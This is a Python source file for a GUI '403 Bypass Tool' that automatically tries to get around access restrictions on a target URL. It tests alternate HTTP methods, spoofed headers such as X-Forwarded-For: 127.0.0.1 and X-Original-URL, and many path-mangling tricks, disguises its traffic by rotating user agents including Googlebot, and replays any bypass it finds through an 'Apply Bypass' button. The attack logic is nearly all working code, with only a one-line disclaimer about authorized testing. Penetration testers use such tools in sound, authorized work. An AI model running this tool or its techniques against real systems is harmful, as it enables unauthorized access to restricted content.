#!/usr/bin/env python3
"""
Professional 403 Bypass Tool with PyQt5 GUI
-------------------------------------------
Author: Basty-devel
Date: 2025-08-08
Version: 3.0

Features:
- Modern PyQt5 GUI with dark theme
- Real-time progress visualization
- Detailed results display
- Apply Bypass button to execute selected techniques
- Export functionality
- Multiple bypass techniques
- Threaded execution to prevent UI freezing
"""

import sys
import requests
import random
import time
import re
from urllib.parse import urlparse, urlunparse, quote, unquote
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                             QLabel, QLineEdit, QPushButton, QTextEdit, QProgressBar,
                             QCheckBox, QGroupBox, QFileDialog, QMessageBox, QTableWidget,
                             QTableWidgetItem, QHeaderView, QTabWidget, QSplitter, 
                             QDialog, QTextBrowser, QSizePolicy)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QFont, QColor, QTextCursor, QPalette

# List of user agents to rotate
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
]

class ResponseViewer(QDialog):
    """Dialog to display response details"""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Response Details")
        self.setGeometry(200, 200, 1000, 700)
        
        layout = QVBoxLayout()
        self.setLayout(layout)
        
        # Request info
        self.info_label = QLabel()
        self.info_label.setWordWrap(True)
        self.info_label.setTextFormat(Qt.RichText)
        self.info_label.setStyleSheet("font-weight: bold; padding: 10px;")
        layout.addWidget(self.info_label)
        
        # Response tabs
        self.tabs = QTabWidget()
        layout.addWidget(self.tabs)
        
        # Headers tab
        headers_tab = QWidget()
        headers_layout = QVBoxLayout(headers_tab)
        self.headers_browser = QTextBrowser()
        self.headers_browser.setFont(QFont("Courier New", 10))
        headers_layout.addWidget(self.headers_browser)
        self.tabs.addTab(headers_tab, "Headers")
        
        # Body tab
        body_tab = QWidget()
        body_layout = QVBoxLayout(body_tab)
        self.body_browser = QTextBrowser()
        self.body_browser.setFont(QFont("Courier New", 10))
        body_layout.addWidget(self.body_browser)
        self.tabs.addTab(body_tab, "Body")
        
        # Close button
        close_btn = QPushButton("Close")
        close_btn.setStyleSheet("background-color: #2e7d32; color: white; padding: 8px;")
        close_btn.clicked.connect(self.close)
        layout.addWidget(close_btn)
    
    def show_response(self, technique, url, method, headers, response):
        """Display response details"""
        # Set request info
        info_html = f"""
        <div style="background-color:#2c3e50; color:white; padding:10px; border-radius:5px;">
            <div><b>Technique:</b> {technique}</div>
            <div><b>URL:</b> {url}</div>
            <div><b>Method:</b> {method}</div>
            <div><b>Status Code:</b> {response.status_code}</div>
            <div><b>Response Size:</b> {len(response.content)} bytes</div>
        </div>
        """
        self.info_label.setText(info_html)
        
        # Set headers
        headers_html = ""
        for key, value in response.headers.items():
            headers_html += f"<b>{key}:</b> {value}<br>"
        self.headers_browser.setHtml(headers_html)
        
        # Set body
        content_type = response.headers.get('Content-Type', '')
        if 'text/html' in content_type:
            self.body_browser.setHtml(response.text)
        elif 'application/json' in content_type:
            try:
                self.body_browser.setPlainText(response.json())
            except:
                self.body_browser.setPlainText(response.text)
        else:
            self.body_browser.setPlainText(response.text)

class BypassWorker(QThread):
    """Worker thread for performing bypass tests"""
    update_progress = pyqtSignal(int, int, str)
    update_log = pyqtSignal(str, str)
    finished = pyqtSignal(list)
    found_bypass = pyqtSignal(dict)

    def __init__(self, target_url, techniques, delay, verbose):
        super().__init__()
        self.target_url = target_url
        self.techniques = techniques
        self.delay = delay
        self.verbose = verbose
        self.abort = False
        self.successful_bypasses = []
        
        # Validate URL
        self.parsed_url = urlparse(target_url)
        if not self.parsed_url.scheme or not self.parsed_url.netloc:
            raise ValueError(f"Invalid URL: {target_url}")
            
        # Session for connection persistence
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
    
    def run(self):
        """Run the bypass tests"""
        total_tests = self.calculate_total_tests()
        tests_completed = 0
        
        # Test original request
        if not self.abort:
            self.test_original()
            tests_completed += 1
            self.update_progress.emit(tests_completed, total_tests, "Initial test completed")
        
        # Run selected tests
        if "methods" in self.techniques and not self.abort:
            tests_completed = self.test_http_methods(tests_completed, total_tests)
            
        if "headers" in self.techniques and not self.abort:
            tests_completed = self.test_headers(tests_completed, total_tests)
            
        if "path" in self.techniques and not self.abort:
            tests_completed = self.test_path_manipulation(tests_completed, total_tests)
            
        if "ip" in self.techniques and not self.abort:
            tests_completed = self.test_ip_spoofing(tests_completed, total_tests)
        
        # Signal completion
        self.finished.emit(self.successful_bypasses)
    
    def calculate_total_tests(self):
        """Calculate total number of tests to run"""
        total = 1  # Original request
        
        if "methods" in self.techniques:
            total += 9  # HTTP methods
            
        if "headers" in self.techniques:
            total += 10  # Headers
            
        if "path" in self.techniques:
            total += 25  # Path techniques
            
        if "ip" in self.techniques:
            total += 9  # IP spoofing
            
        return total
    
    def test_original(self):
        """Test the original request to establish baseline"""
        self.update_log.emit(f"Testing original request: {self.target_url}", "info")
        try:
            response = self.session.get(self.target_url)
            if response.status_code == 403:
                self.update_log.emit("Original request returns 403 Forbidden - proceeding with bypass techniques", "warning")
            else:
                self.update_log.emit(f"Original request returned {response.status_code} - not a 403 page", "warning")
            return response.status_code
        except requests.exceptions.RequestException as e:
            self.update_log.emit(f"Request failed: {str(e)}", "error")
            return None

    def test_http_methods(self, completed, total):
        """Test various HTTP methods for bypass"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH', 'TRACE', 'CONNECT']
        self.update_log.emit(f"Testing HTTP methods: {', '.join(methods)}", "info")
        
        for method in methods:
            if self.abort:
                return completed
                
            time.sleep(self.delay)
            try:
                response = self.session.request(method, self.target_url)
                if response.status_code != 403 and response.status_code != 401:
                    self.update_log.emit(f"Method {method} returned {response.status_code} (Potential Bypass!)", "success")
                    bypass = {
                        'technique': f'HTTP Method: {method}',
                        'status_code': response.status_code,
                        'response_size': len(response.content),
                        'url': self.target_url,
                        'method': method,
                        'headers': {}
                    }
                    self.successful_bypasses.append(bypass)
                    self.found_bypass.emit(bypass)
                elif self.verbose:
                    self.update_log.emit(f"Method {method} returned {response.status_code}", "info")
            except requests.exceptions.RequestException as e:
                self.update_log.emit(f"Method {method} failed: {str(e)}", "error")
            
            completed += 1
            self.update_progress.emit(completed, total, f"Testing method: {method}")
        
        return completed
    
    def test_headers(self, completed, total):
        """Test various bypass headers"""
        headers_to_test = {
            'X-Original-URL': self.parsed_url.path,
            'X-Rewrite-URL': self.parsed_url.path,
            'Referer': 'https://www.google.com/',
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Custom-IP-Authorization': '127.0.0.1',
            'X-Forwarded-Host': 'localhost',
            'X-Host': 'localhost',
            'X-ProxyUser-IP': '127.0.0.1',
            'CF-Connecting-IP': '127.0.0.1'
        }
        
        self.update_log.emit("Testing bypass headers", "info")
        
        for header, value in headers_to_test.items():
            if self.abort:
                return completed
                
            time.sleep(self.delay)
            try:
                headers = {header: value}
                response = self.session.get(self.target_url, headers=headers)
                
                if response.status_code != 403 and response.status_code != 401:
                    self.update_log.emit(f"Header {header}: {value} returned {response.status_code} (Potential Bypass!)", "success")
                    bypass = {
                        'technique': f'Header: {header} = {value}',
                        'status_code': response.status_code,
                        'response_size': len(response.content),
                        'url': self.target_url,
                        'method': 'GET',
                        'headers': headers
                    }
                    self.successful_bypasses.append(bypass)
                    self.found_bypass.emit(bypass)
                elif self.verbose:
                    self.update_log.emit(f"Header {header}: {value} returned {response.status_code}", "info")
            except requests.exceptions.RequestException as e:
                self.update_log.emit(f"Header {header} failed: {str(e)}", "error")
            
            completed += 1
            self.update_progress.emit(completed, total, f"Testing header: {header}")
        
        return completed
    
    def test_path_manipulation(self, completed, total):
        """Test path manipulation techniques"""
        path = self.parsed_url.path
        bypass_techniques = [
            (path + '/', "Append trailing slash"),
            (path.rstrip('/'), "Remove trailing slash"),
            (path + '//', "Double slash"),
            (path + '/.', "Append dot"),
            (path + '/..;/', "Append dot dot semicolon"),
            (path + '%20', "Append space"),
            (path + '%09', "Append tab"),
            (path + '?', "Append question mark"),
            (path + '??', "Append double question mark"),
            (path + '.json', "Append .json"),
            (path + '.php', "Append .php"),
            (path + '.html', "Append .html"),
            (path + '%2e', "URL-encoded dot"),
            (path + '%252e', "Double URL-encoded dot"),
            (path + '/;' + path.split('/')[-1], "Path with semicolon"),
            ('/' + '/'.join(path.split('/')[1:-1]) + ';/' + path.split('/')[-1], "Semicolon in path"),
            (quote(unquote(path)), "URL encoding"),
            (quote(quote(path)), "Double URL encoding"),
            (path.upper(), "Uppercase path"),
            (path.lower(), "Lowercase path"),
            (path + '~1', "Append tilde"),
            (path + '/.\\', "Append dot backslash"),
            (path + '/..\\', "Append dot dot backslash"),
            (path + '....//', "Multiple dots and slashes"),
            (path + '%2f%2f', "Encoded double slash")
        ]
        
        self.update_log.emit("Testing path manipulation techniques", "info")
        
        for new_path, technique in bypass_techniques:
            if self.abort:
                return completed
                
            time.sleep(self.delay)
            try:
                # Create new URL with manipulated path
                new_url = urlunparse((
                    self.parsed_url.scheme,
                    self.parsed_url.netloc,
                    new_path,
                    self.parsed_url.params,
                    self.parsed_url.query,
                    self.parsed_url.fragment
                ))
                
                response = self.session.get(new_url)
                
                if response.status_code != 403 and response.status_code != 401:
                    self.update_log.emit(f"Path: {technique} returned {response.status_code} (Potential Bypass!)", "success")
                    bypass = {
                        'technique': f'Path: {technique}',
                        'status_code': response.status_code,
                        'response_size': len(response.content),
                        'url': new_url,
                        'method': 'GET',
                        'headers': {}
                    }
                    self.successful_bypasses.append(bypass)
                    self.found_bypass.emit(bypass)
                elif self.verbose:
                    self.update_log.emit(f"Path: {technique} returned {response.status_code}", "info")
            except requests.exceptions.RequestException as e:
                self.update_log.emit(f"Path {technique} failed: {str(e)}", "error")
            
            completed += 1
            self.update_progress.emit(completed, total, f"Testing path: {technique}")
        
        return completed
    
    def test_ip_spoofing(self, completed, total):
        """Test IP spoofing techniques"""
        ip_headers = {
            'X-Forwarded-For': ['127.0.0.1', 'localhost', '0.0.0.0'],
            'X-Real-IP': ['127.0.0.1', '::1'],
            'CF-Connecting-IP': ['127.0.0.1'],
            'True-Client-IP': ['127.0.0.1'],
            'X-Client-IP': ['127.0.0.1']
        }
        
        self.update_log.emit("Testing IP spoofing headers", "info")
        
        for header, values in ip_headers.items():
            for value in values:
                if self.abort:
                    return completed
                    
                time.sleep(self.delay)
                try:
                    headers = {header: value}
                    response = self.session.get(self.target_url, headers=headers)
                    
                    if response.status_code != 403 and response.status_code != 401:
                        self.update_log.emit(f"IP Spoof: {header} = {value} returned {response.status_code} (Potential Bypass!)", "success")
                        bypass = {
                            'technique': f'IP Spoof: {header} = {value}',
                            'status_code': response.status_code,
                            'response_size': len(response.content),
                            'url': self.target_url,
                            'method': 'GET',
                            'headers': headers
                        }
                        self.successful_bypasses.append(bypass)
                        self.found_bypass.emit(bypass)
                    elif self.verbose:
                        self.update_log.emit(f"IP Spoof: {header} = {value} returned {response.status_code}", "info")
                except requests.exceptions.RequestException as e:
                    self.update_log.emit(f"IP Spoof {header} failed: {str(e)}", "error")
                
                completed += 1
                self.update_progress.emit(completed, total, f"Testing IP: {header}={value}")
        
        return completed

class MainWindow(QMainWindow):
    """Main application window for the 403 Bypass Tool"""
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Professional 403 Bypass Tool")
        self.setGeometry(100, 100, 1100, 700)
        
        # Apply dark theme
        self.apply_dark_theme()
        
        # Create central widget and layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setContentsMargins(15, 15, 15, 15)
        main_layout.setSpacing(15)
        
        # Create tabs
        tabs = QTabWidget()
        main_layout.addWidget(tabs)
        
        # Create bypass tab
        bypass_tab = QWidget()
        tabs.addTab(bypass_tab, "Bypass Tool")
        bypass_layout = QVBoxLayout(bypass_tab)
        
        # Target URL input
        url_layout = QHBoxLayout()
        url_layout.addWidget(QLabel("Target URL:"))
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://example.com/restricted-path")
        url_layout.addWidget(self.url_input)
        bypass_layout.addLayout(url_layout)
        
        # Techniques selection
        techniques_group = QGroupBox("Bypass Techniques")
        techniques_layout = QHBoxLayout()
        self.methods_check = QCheckBox("HTTP Methods")
        self.methods_check.setChecked(True)
        self.headers_check = QCheckBox("Headers")
        self.headers_check.setChecked(True)
        self.path_check = QCheckBox("Path Manipulation")
        self.path_check.setChecked(True)
        self.ip_check = QCheckBox("IP Spoofing")
        self.ip_check.setChecked(True)
        self.verbose_check = QCheckBox("Verbose Output")
        
        techniques_layout.addWidget(self.methods_check)
        techniques_layout.addWidget(self.headers_check)
        techniques_layout.addWidget(self.path_check)
        techniques_layout.addWidget(self.ip_check)
        techniques_layout.addWidget(self.verbose_check)
        techniques_group.setLayout(techniques_layout)
        bypass_layout.addWidget(techniques_group)
        
        # Delay setting
        delay_layout = QHBoxLayout()
        delay_layout.addWidget(QLabel("Delay between requests (seconds):"))
        self.delay_input = QLineEdit("0.3")
        self.delay_input.setFixedWidth(60)
        delay_layout.addWidget(self.delay_input)
        delay_layout.addStretch()
        bypass_layout.addLayout(delay_layout)
        
        # Buttons
        buttons_layout = QHBoxLayout()
        self.start_button = QPushButton("Start Bypass")
        self.start_button.setStyleSheet("background-color: #2e7d32; color: white;")
        self.start_button.clicked.connect(self.start_bypass)
        self.stop_button = QPushButton("Stop")
        self.stop_button.setStyleSheet("background-color: #c62828; color: white;")
        self.stop_button.setEnabled(False)
        self.stop_button.clicked.connect(self.stop_bypass)
        self.export_button = QPushButton("Export Results")
        self.export_button.clicked.connect(self.export_results)
        self.apply_button = QPushButton("Apply Bypass")
        self.apply_button.setStyleSheet("background-color: #1565C0; color: white;")
        self.apply_button.setEnabled(False)
        self.apply_button.clicked.connect(self.apply_bypass)
        
        buttons_layout.addWidget(self.start_button)
        buttons_layout.addWidget(self.stop_button)
        buttons_layout.addWidget(self.export_button)
        buttons_layout.addWidget(self.apply_button)
        bypass_layout.addLayout(buttons_layout)
        
        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setFormat("Ready")
        bypass_layout.addWidget(self.progress_bar)
        
        # Results table
        results_group = QGroupBox("Results")
        results_layout = QVBoxLayout()
        self.results_table = QTableWidget()
        self.results_table.setColumnCount(4)
        self.results_table.setHorizontalHeaderLabels(["Technique", "Status Code", "Size", "URL"])
        self.results_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        self.results_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeToContents)
        self.results_table.horizontalHeader().setSectionResizeMode(2, QHeaderView.ResizeToContents)
        self.results_table.horizontalHeader().setSectionResizeMode(3, QHeaderView.Stretch)
        self.results_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.results_table.setEditTriggers(QTableWidget.NoEditTriggers)
        
        results_layout.addWidget(self.results_table)
        results_group.setLayout(results_layout)
        bypass_layout.addWidget(results_group)
        
        # Log output
        log_group = QGroupBox("Log Output")
        log_layout = QVBoxLayout()
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setFont(QFont("Courier New", 10))
        log_layout.addWidget(self.log_output)
        log_group.setLayout(log_layout)
        bypass_layout.addWidget(log_group)
        
        # Results data
        self.bypass_results = []
        self.response_viewer = ResponseViewer()
        
        # Status bar
        self.statusBar().showMessage("Ready")
        
        # Set initial focus
        self.url_input.setFocus()
    
    def apply_dark_theme(self):
        """Apply a dark theme to the application"""
        dark_palette = QPalette()
        dark_palette.setColor(QPalette.Window, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.WindowText, Qt.white)
        dark_palette.setColor(QPalette.Base, QColor(25, 25, 25))
        dark_palette.setColor(QPalette.AlternateBase, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.ToolTipBase, Qt.white)
        dark_palette.setColor(QPalette.ToolTipText, Qt.white)
        dark_palette.setColor(QPalette.Text, Qt.white)
        dark_palette.setColor(QPalette.Button, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.ButtonText, Qt.white)
        dark_palette.setColor(QPalette.BrightText, Qt.red)
        dark_palette.setColor(QPalette.Link, QColor(42, 130, 218))
        dark_palette.setColor(QPalette.Highlight, QColor(42, 130, 218))
        dark_palette.setColor(QPalette.HighlightedText, Qt.black)
        QApplication.setPalette(dark_palette)
    
    def log_message(self, message, msg_type="info"):
        """Add a message to the log output with color coding"""
        if msg_type == "success":
            color = "#4CAF50"  # Green
            prefix = "[+] "
        elif msg_type == "error":
            color = "#F44336"  # Red
            prefix = "[-] "
        elif msg_type == "warning":
            color = "#FFC107"  # Yellow
            prefix = "[!] "
        else:
            color = "#2196F3"  # Blue
            prefix = "[*] "
        
        self.log_output.moveCursor(QTextCursor.End)
        self.log_output.setTextColor(QColor(color))
        self.log_output.insertPlainText(prefix + message + "\n")
        self.log_output.ensureCursorVisible()
    
    def start_bypass(self):
        """Start the bypass testing process"""
        url = self.url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Input Error", "Please enter a target URL")
            return
            
        try:
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                raise ValueError("Invalid URL format")
        except Exception as e:
            QMessageBox.warning(self, "URL Error", f"Invalid URL: {str(e)}")
            return
        
        # Get selected techniques
        techniques = []
        if self.methods_check.isChecked():
            techniques.append("methods")
        if self.headers_check.isChecked():
            techniques.append("headers")
        if self.path_check.isChecked():
            techniques.append("path")
        if self.ip_check.isChecked():
            techniques.append("ip")
        
        if not techniques:
            QMessageBox.warning(self, "Selection Error", "Please select at least one bypass technique")
            return
        
        # Get delay
        try:
            delay = float(self.delay_input.text())
            if delay < 0:
                raise ValueError("Delay must be positive")
        except Exception:
            QMessageBox.warning(self, "Input Error", "Please enter a valid delay value")
            return
        
        # Clear previous results
        self.results_table.setRowCount(0)
        self.log_output.clear()
        self.bypass_results = []
        
        # Update UI
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.export_button.setEnabled(False)
        self.apply_button.setEnabled(False)
        self.progress_bar.setValue(0)
        self.progress_bar.setFormat("Starting...")
        
        # Show ethical warning
        self.log_message("DISCLAIMER: This tool is for educational and authorized security testing only.", "warning")
        self.log_message("Unauthorized access to computer systems is illegal. Use only with explicit permission.", "warning")
        self.log_message(f"Starting bypass tests for: {url}", "info")
        
        # Create and start worker thread
        self.worker = BypassWorker(
            target_url=url,
            techniques=techniques,
            delay=delay,
            verbose=self.verbose_check.isChecked()
        )
        self.worker.update_progress.connect(self.update_progress)
        self.worker.update_log.connect(self.log_message)
        self.worker.finished.connect(self.bypass_finished)
        self.worker.found_bypass.connect(self.add_bypass_result)
        self.worker.start()
    
    def stop_bypass(self):
        """Stop the bypass testing process"""
        if hasattr(self, 'worker') and self.worker.isRunning():
            self.worker.abort = True
            self.log_message("Bypass testing stopped by user", "warning")
            self.stop_button.setEnabled(False)
    
    def bypass_finished(self, results):
        """Handle completion of bypass testing"""
        self.bypass_results = results
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.export_button.setEnabled(True)
        self.apply_button.setEnabled(bool(results))
        self.progress_bar.setValue(100)
        
        if results:
            self.progress_bar.setFormat(f"Complete! Found {len(results)} bypasses")
            self.log_message(f"Testing complete. Found {len(results)} potential bypasses", "success")
        else:
            self.progress_bar.setFormat("Complete! No bypasses found")
            self.log_message("Testing complete. No bypasses found.", "warning")
        
        self.statusBar().showMessage(f"Bypass testing completed - {len(results)} bypasses found")
    
    def update_progress(self, completed, total, message):
        """Update progress bar and status message"""
        if total > 0:
            percent = int((completed / total) * 100)
            self.progress_bar.setValue(percent)
            self.progress_bar.setFormat(f"{message} - {percent}%")
        self.statusBar().showMessage(message)
    
    def add_bypass_result(self, bypass):
        """Add a bypass result to the table"""
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)
        
        self.results_table.setItem(row, 0, QTableWidgetItem(bypass['technique']))
        self.results_table.setItem(row, 1, QTableWidgetItem(str(bypass['status_code'])))
        
        # Color code status codes
        status_item = self.results_table.item(row, 1)
        if 200 <= bypass['status_code'] < 300:
            status_item.setBackground(QColor(46, 125, 50))  # Green for success
        elif 300 <= bypass['status_code'] < 400:
            status_item.setBackground(QColor(251, 192, 45))  # Yellow for redirect
        else:
            status_item.setBackground(QColor(244, 67, 54))  # Red for other
        
        self.results_table.setItem(row, 2, QTableWidgetItem(f"{bypass['response_size']} bytes"))
        self.results_table.setItem(row, 3, QTableWidgetItem(bypass['url']))
        
        # Store full bypass details for later use
        self.bypass_results.append(bypass)
    
    def export_results(self):
        """Export results to a file"""
        if not self.bypass_results:
            QMessageBox.information(self, "Export", "No results to export")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Export Results",
            "",
            "Text Files (*.txt);;CSV Files (*.csv);;All Files (*)"
        )
        
        if not file_path:
            return
        
        try:
            if file_path.endswith('.csv'):
                self.export_csv(file_path)
            else:
                self.export_txt(file_path)
                
            QMessageBox.information(self, "Export Successful", "Results exported successfully")
        except Exception as e:
            QMessageBox.critical(self, "Export Error", f"Failed to export results: {str(e)}")
    
    def export_txt(self, file_path):
        """Export results to a text file"""
        with open(file_path, 'w') as f:
            f.write("403 Bypass Tool Results\n")
            f.write("=" * 50 + "\n\n")
            f.write(f"Target URL: {self.url_input.text()}\n")
            f.write(f"Bypasses found: {len(self.bypass_results)}\n\n")
            
            for i, bypass in enumerate(self.bypass_results, 1):
                f.write(f"Bypass #{i}\n")
                f.write(f"Technique: {bypass['technique']}\n")
                f.write(f"Status Code: {bypass['status_code']}\n")
                f.write(f"Response Size: {bypass['response_size']} bytes\n")
                f.write(f"URL: {bypass['url']}\n")
                f.write("-" * 50 + "\n")
    
    def export_csv(self, file_path):
        """Export results to a CSV file"""
        with open(file_path, 'w') as f:
            f.write("Technique,Status Code,Response Size,URL\n")
            for bypass in self.bypass_results:
                f.write(f"\"{bypass['technique']}\",")
                f.write(f"{bypass['status_code']},")
                f.write(f"{bypass['response_size']},")
                f.write(f"\"{bypass['url']}\"\n")
    
    def apply_bypass(self):
        """Apply selected bypass techniques"""
        selected_rows = self.results_table.selectionModel().selectedRows()
        if not selected_rows:
            QMessageBox.warning(self, "Selection Error", "Please select at least one bypass technique to apply")
            return
        
        # Create a session for requests
        session = requests.Session()
        session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        
        # Show the response viewer
        self.response_viewer = ResponseViewer(self)
        self.response_viewer.show()
        
        # Process each selected row
        for row_index in selected_rows:
            row = row_index.row()
            if row < len(self.bypass_results):
                bypass = self.bypass_results[row]
                
                try:
                    # Parse headers from technique if needed
                    headers = bypass.get('headers', {})
                    
                    # For path techniques, we already have the manipulated URL
                    url = bypass['url']
                    
                    # Send the request
                    response = session.request(
                        bypass['method'], 
                        url, 
                        headers=headers,
                        timeout=10
                    )
                    
                    # Display the response
                    self.response_viewer.show_response(
                        bypass['technique'],
                        url,
                        bypass['method'],
                        headers,
                        response
                    )
                    
                except Exception as e:
                    self.log_message(f"Failed to apply bypass {bypass['technique']}: {str(e)}", "error")
                    QMessageBox.warning(self, "Request Failed", f"Failed to apply bypass:\n{bypass['technique']}\n\nError: {str(e)}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    
    # Set application font
    font = QFont()
    font.setFamily("Segoe UI")
    font.setPointSize(10)
    app.setFont(font)
    
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())